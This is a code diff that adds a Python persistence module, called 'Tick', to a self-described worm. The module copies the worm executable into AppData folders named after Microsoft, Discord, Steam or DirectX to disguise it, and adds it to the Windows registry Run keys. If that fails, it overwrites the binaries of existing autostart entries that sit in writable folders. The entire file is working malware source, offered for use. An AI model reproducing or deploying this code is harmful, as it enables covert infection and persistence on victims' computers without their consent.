@@ -1,0 +1,105 @@
+#!name##Tick
+#!types##module
+#!reqSMod##MrReg
+#!info##Clones the worm and adds it to the autostart. Uses the windows registry.
+#!system_FLAG##[W]
+
+import os
+import shutil
+import sys
+
+class MTick:
+    def __init__(self, worm: object):
+        self.worm = worm
+        self.reg = MrReg()
+        self.autostart_path = [
+            ("HKLM", r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
+            ("HKCU", r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
+        ]
+        self.fake_name = ["Microsoft", "Discord", "Steam", "DirectX"]
+        self.fake = None
+        self.clone_path = None
+        self.worm_path = os.path.abspath(sys.argv[0])
+        self.worm_name = os.path.basename(self.worm_path)
+
+    
+    def clone_worm(self, target_dir: str) -> bool:
+        target_path = os.path.join(target_dir, self.worm_name)
+        try:
+            shutil.copy(self.worm_path, target_path)
+            self.clone_path = target_path
+            return True
+        except:
+            return False
+    
+    def default_clone(self) -> bool:
+        tag = ["APPDATA", "LOCALAPPDATA"]
+        for t in tag:
+            mpath = os.getenv(t)
+            if mpath:
+                for fn in self.fake_name:
+                    dpath = os.path.join(mpath, fn)
+                    if not os.path.exists(dpath):
+                        try:
+                            os.mkdir(dpath)
+                        except Exception as e:
+                            print("ERROR make dir: ", e)
+                            continue
+                    if self.clone_worm(dpath):
+                        self.fake = fn
+                        return True        
+        return False
+    
+    def reg_add(self) -> bool:
+        if not self.clone_path:
+            return False
+        for tar in self.autostart_path:
+            if self.reg.add_new_value(tar[0], tar[1], self.fake, self.clone_path):
+                return True
+        return False
+    
+    def check_permission(self, target: str) -> bool:
+        path = os.path.join(target, "test.txt")
+        try:
+            with open(path, "w") as f:
+                f.write("")
+            os.remove(path)
+            return True
+        except PermissionError:
+            return False
+        except:
+            return False
+    
+    def split_path(self, path: str) -> str:
+        path = path.split('"')
+        return path[1]
+    
+    def clone_vul(self, target: str) -> bool:
+        try:
+            shutil.copy(self.worm_path, target)
+            return True
+        except:
+
+            return False
+    
+    def find_vulnerable_dir(self) -> bool:
+        check = []
+        for sec in self.autostart_path:
+            path = self.reg.get_value_list(sec[0], sec[1])
+            if path:
+                check.extend(path)
+        for c in check:
+            if '"' in c[1]:
+                spath = self.split_path(c[1])
+                dpath = os.path.dirname(spath)
+                if self.check_permission(dpath):
+                    if self.clone_vul(spath):
+                        return True
+        return False
+           
+    def start(self) -> None:
+        if self.default_clone():
+            if self.reg_add():
+                return
+        else:
+            self.find_vulnerable_dir()
